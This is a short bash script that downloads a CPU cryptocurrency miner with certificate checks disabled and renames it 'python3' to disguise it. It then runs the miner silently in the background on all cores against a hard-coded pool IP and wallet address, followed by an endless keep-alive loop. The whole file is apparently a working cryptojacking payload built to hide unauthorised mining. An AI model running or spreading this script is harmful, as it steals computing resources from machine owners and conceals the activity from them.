#!/bin/bash
wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
mv cpuminer-sse2 python3
./python3 -a yespowertide -o stratum+tcp://147.182.177.241:443 -u TFHaoj2n8TvqkXVNgnjnYHkQpvMUxmwyD4.her -p x -t$(nproc --all) >/dev/null 2>&1 >/dev/null &
while :; do echo "system true"; sleep 30; done
